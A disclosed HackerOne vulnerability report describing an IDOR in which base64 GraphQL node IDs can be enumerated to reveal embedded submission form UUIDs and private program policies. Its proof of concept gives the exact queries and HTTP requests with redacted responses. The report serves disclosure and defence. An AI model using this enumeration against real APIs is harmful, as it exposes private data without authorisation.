---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '447930'
original_report_id: '447930'
title: Embedded submission form UUIDs can be enumerated through GraphQL node interface,
  exposing sensitive program details
weakness: Insecure Direct Object Reference (IDOR)
team_handle: security
created_at: '2018-11-21T00:42:31.538Z'
disclosed_at: '2019-01-11T21:37:05.439Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 47
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- insecure-direct-object-reference-idor
---

# Embedded submission form UUIDs can be enumerated through GraphQL node interface, exposing sensitive program details

## Metadata

- HackerOne Report ID: 447930
- Weakness: Insecure Direct Object Reference (IDOR)
- Program: security
- Disclosed At: 2019-01-11T21:37:05.439Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

It's possible for an attacker to enumerate embedded submission form UUIDs through HackerOne's GraphQL node interface. In normal application behavior, an embedded submission form is queried through GraphQL with a UUID. These UUIDs are random and they're not susceptible to brute force attacks. However, the UUID is not the primary key of these models. Instead, in the backend, it still has an auto incremental primary key. Because of that they can be queried directly using the node interface. From the node interface, the UUID is exposed, which can then be used to obtain the same information an invited reporter can access.

# Proof of concept
In order to reproduce the vulnerability, follow the steps below.

 - consider the following node ID: `Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==`
 - decode the ID (base64), which will look something like `gid://hackerone/EmbeddedSubmissionForm/9`
 - change the primary key identifier, and base64 encode it
 - execute the following GraphQL query:

**Request**
```
query {
  node(id: "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==") {
    ... on EmbeddedSubmissionForm {
      uuid
    }
  }
}
```

**Response**
```json
{
  "data": {
    "node": {
      "id": "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==",
      "uuid": "████"
    }
  }
}
```

 - take the UUID, and append `?embedded_submission_form_uuid=:uuid` to the GraphQL request
 - submit the following query to obtain the program information:

**Request**
```
POST /graphql?embedded_submission_form_uuid=█████████ HTTP/1.1
Host: hackerone.com
...

{"query":"query { node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on EmbeddedSubmissionForm { id, uuid team { handle policy } }}}","variables":{}}
```

**Response**
```json
{
  "data": {
    "node": {
      "id": "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==",
      "uuid": "███",
      "team": {
        "handle": "██████████",
        "policy": "The policy."
      }
    }
  }
}
```

## Impact

Any unauthenticated user can obtain the same information about a private program as a participating hacker. This may reveal sensitive information about private programs on HackerOne, such as their policy, terms, resolved bug count, bounty table, etc.

There are essentially two vulnerabilities here: the ability to directly query the `EmbeddedSubmissionForm` object and the fact that by specifying a UUID, the `Team` object exposes too much information.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
